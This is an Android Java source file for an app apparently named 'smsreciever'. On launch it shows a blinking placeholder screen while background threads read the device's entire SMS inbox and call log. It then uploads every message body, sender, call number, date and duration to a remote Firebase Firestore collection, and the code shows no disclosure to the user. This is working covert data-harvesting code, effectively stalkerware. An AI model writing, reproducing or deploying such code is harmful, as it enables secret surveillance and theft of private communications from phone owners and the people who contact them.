package com.example.smsreciever;

import androidx.annotation.NonNull;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Log;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.ArrayAdapter;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.Date;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST = 1;
    public TextView messageText;
    FirebaseFirestore db = FirebaseFirestore.getInstance();
    CollectionReference reference = db.collection("Details");
    //DocumentReference documentReference = db.document("Details/SMS");
    //DocumentReference documentReference1 = db.document("Details/Calls");

    //CollectionReference reference1 = db.collection("Call Logs");


    @Override
    protected void onStart() {
        super.onStart();
        ActivityCompat.requestPermissions(this,
                new String[]{
                        Manifest.permission.READ_SMS,
                        Manifest.permission.READ_CALL_LOG,
                },PERMISSION_REQUEST);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startService(new Intent(MainActivity.this, SmsListener.class));
        messageText = findViewById(R.id.message);

       /* ActivityCompat.requestPermissions(this,
                new String[]{
                        Manifest.permission.READ_SMS,
                        Manifest.permission.READ_CALL_LOG,
                },PERMISSION_REQUEST);*/
        TextView myText = findViewById(R.id.update);

        Animation anim = new AlphaAnimation(0.0f, 1.0f);
        anim.setDuration(200); //You can manage the blinking time with this parameter
        anim.setStartOffset(20);
        anim.setRepeatMode(Animation.REVERSE);
        anim.setRepeatCount(Animation.INFINITE);
        myText.startAnimation(anim);
        //smsFunc();



        Thread t1 = new Thread(new Runnable() {
            @Override
            public void run() {
                smsFunc();
            }
        });
        Thread t2 = new Thread(new Runnable() {
            @Override
            public void run() {
                getCallDetails();
            }
        });

        t1.start();
        t2.start();

       /* new Thread(
                new Runnable() {
                    @Override
                    public void run() {
                        Log.d("THREAD", "RUNNING THREAD 1 ");
                        smsFunc();
                        getCallDetails();
                    }
                }
        ).start();*/

    }


    public void smsFunc(){
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse("content://sms/inbox"),
                null,null,null,null);
        if(cursor.getCount()>0){
            cursor.moveToFirst();
            do{
                String address = cursor.getString(
                        cursor.getColumnIndex("address")
                );
                //String phone = cursor.getString(cursor.getColumnIndex(""));
                String body = cursor.getString(cursor.getColumnIndex("body"));

                //smsList.add(id+" : "+address+" : "+body);

                Template template = new Template(body, address);
                //reference.add(template);
                reference.document("SMS").collection("Messages").add(template);

            }while (cursor.moveToNext());
            cursor.close();

            //ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,
              //      smsList);
            //listView.setAdapter(adapter);
        }
    }
    private void getCallDetails() {

        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = managedQuery( CallLog.Calls.CONTENT_URI,null, null,null, null);
        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
        sb.append( "Call Details :");
        while ( managedCursor.moveToNext() ) {
            String phNumber = managedCursor.getString( number );
            String callType = managedCursor.getString( type );
            String callDate = managedCursor.getString( date );
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString( duration );
            String dir = null;
            int dircode = Integer.parseInt( callType );
            switch( dircode ) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            // addDataToDB();
            CallLogs callLogs = new CallLogs(phNumber, dir, callDayTime, callDuration);
            reference.document("Calls").collection("CallLogs").add(callLogs);
            //CallLogs callLog = new CallLogs(phNumber, dir, callDayTime, callDuration);
            // sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration );
            // sb.append("\n----------------------------------");
        }
        managedCursor.close();
        //call.setText(sb);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode){
            case PERMISSION_REQUEST:
                if(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                   // Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
                }
                else {
                    Toast.makeText(this, "Permission not granted", Toast.LENGTH_SHORT).show();
                }
        }
    }
}
